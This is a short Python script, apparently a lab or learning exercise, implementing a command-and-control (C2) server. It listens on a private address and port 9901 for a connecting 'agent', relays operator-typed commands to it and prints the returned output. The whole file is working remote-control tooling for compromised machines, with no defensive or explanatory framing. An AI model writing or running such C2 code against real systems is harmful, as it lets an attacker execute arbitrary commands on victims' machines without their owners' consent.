# c2_server.py
import socket
import threading

def handle_client(client):
    print("[+] Agent connected")

    while True:
        cmd = input("C2> ")   # 管理者が命令
        if cmd == "exit":
            client.send(b"exit")
            break

        client.send(cmd.encode())
        result = client.recv(4096).decode()
        print(result)

    client.close()

server = socket.socket()
server.bind(("192.168.10.111", 9901))
server.listen(1)
print("[*] C2 listening on 9901")

client, addr = server.accept()
handle_client(client)
